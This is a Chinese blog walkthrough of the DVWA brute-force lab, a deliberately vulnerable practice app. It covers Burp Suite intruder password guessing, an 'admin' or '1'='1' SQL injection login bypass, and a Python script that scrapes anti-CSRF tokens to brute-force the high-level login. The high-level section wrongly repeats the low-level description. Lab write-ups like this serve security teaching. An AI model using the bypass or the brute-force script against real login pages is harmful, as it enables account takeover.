---
title:      "Brute Force ---dvwa"
description: "主要用来记录dvwa靶场 中 暴力 破解方式"
author:     "伍帆"
date: 2022-06-29
image: "/img/home-bg.jpg"
published: true
tags:
    - 靶场
    - dvwa
URL: "/2022/6/brute force/"
categories: [ "网安" ]
---

##  Brute Force简介
>Brute Force，即暴力（破解），是指黑客利用密码字典，使用穷举法猜解出用户口令，是现在最为广泛使用的攻击手法之一


## LOW 级别破解
>查看源代码
![blind](/img/BruteForce/low.png)
> 可以看到，服务器只是验证了参数Login是否被设置（isset函数在php中用来检测变量是否设置，该函数返回的是布尔类型的值，即true/false），没有任何的防爆破机制，且对参数username、password没有做任何过滤，存在明显的sql注入漏洞。
### 利用burpsuite进行爆破

#### 1.抓包
![blind](/img/BruteForce/1-1.png)
![blind](/img/BruteForce/1-2.png)

#### 2.intruder模块进行爆破
![blind](/img/BruteForce/1-3.png)

#### 3.选中Payloads
![blind](/img/BruteForce/1-4.png)
#### 4. 进行爆破
    尝试在爆破结果中找到正确的密码，可以看到password的响应包长度（length）“与众不同”，可推测password为正确密码，手工验证登陆成功。
![blind](/img/BruteForce/1-5.png)

### 使用手工注入的方式
输入username:`admin' or '1'='1`
不输入password:
![blind](/img/BruteForce/1-6.png)

## Medium 级别破解
>查看源代码
![blind](/img/BruteForce/medium.png)
> 相比Low级别的代码，Medium级别的代码主要增加了mysql_real_escape_string函数，这个函数会对字符串中的特殊符号（x00，n，r，，’，”，x1a）进行转义，基本上能够抵御sql注入攻击，说基本上是因为查到说 MySQL5.5.37以下版本如果设置编码为GBK，能够构造编码绕过mysql_real_escape_string 对单引号的转义（因实验环境的MySQL版本较新，所以并未做相应验证）；同时，$pass做了MD5校验，杜绝了通过参数password进行sql注入的可能性。但是，依然没有加入有效的防爆破机制（sleep(2)实在算不上）。
    
    虽然sql注入不再有效，但依然可以使用Burpsuite进行爆破，与Low级别的爆破方法基本一样，这里就不赘述了。
## High 级别破解
>查看源代码
![blind](/img/BruteForce/high.png)
> 可以看到，服务器只是验证了参数Login是否被设置（isset函数在php中用来检测变量是否设置，该函数返回的是布尔类型的值，即true/false），没有任何的防爆破机制，且对参数username、password没有做任何过滤，存在明显的sql注入漏洞。
High级别的代码加入了Token，可以抵御CSRF攻击，同时也增加了爆破的难度，通过抓包，可以看到，登录验证时提交了四个参数：username、password、Login以及user_token。
> ![blind](/img/BruteForce/3-1.png)
> High级别的代码中，使用了stripslashes（去除字符串中的反斜线字符,如果有两个连续的反斜线,则只去掉一个）、 mysql_real_escape_string对参数username、password进行过滤、转义，进一步抵御sql注入

由于加入了Anti-CSRFtoken预防无脑爆破，这里就不推荐用Burpsuite了，还是简单用python写个脚本吧。
```python
from bs4 import BeautifulSoup
import urllib2
header={        'Host': '192.168.153.130',
		'Cache-Control': 'max-age=0',
		'If-None-Match': "307-52156c6a290c0",
		'If-Modified-Since': 'Mon, 05 Oct 2015 07:51:07 GMT',
		'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36',
		'Accept': '*/*',
		'Referer': 'http://192.168.153.130/dvwa/vulnerabilities/brute/index.php',
		'Accept-Encoding': 'gzip, deflate, sdch',
		'Accept-Language': 'zh-CN,zh;q=0.8',
		'Cookie': 'security=high; PHPSESSID=5re92j36t4f2k1gvnqdf958bi2'}
requrl = "http://192.168.153.130/dvwa/vulnerabilities/brute/"

def get_token(requrl,header):
	req = urllib2.Request(url=requrl,headers=header)
	response = urllib2.urlopen(req)
	print response.getcode(),
	the_page = response.read()
	print len(the_page)
	soup = BeautifulSoup(the_page,"html.parser")
	user_token = soup.form.input.input.input.input["value"] #get the user_token
	return user_token

user_token = get_token(requrl,header)
i=0
for line in open("rkolin.txt"):
	requrl = "http://192.168.153.130/dvwa/vulnerabilities/brute/"+"?username=admin&password="+line.strip()+"&Login=Login&user_token="+user_token
	i = i+1
	print i,'admin',line.strip(),
	user_token = get_token(requrl,header)
	if (i == 10):
		break
```
    get_token的功能是通过python的BeautifulSoup库从html页面中抓取user_token的值，
    为了方便展示，这里设置只尝试10次。

运行脚本时的Burpsuite截图
![blind](/img/BruteForce/3-2.png)
打印的结果从第二行开始依次是序号、用户名、密码、http状态码以及返回的页面长度。
![blind](/img/BruteForce/3-3.png)
对比结果看到，密码为password时返回的长度不太一样，手工验证，登录成功，爆破完成。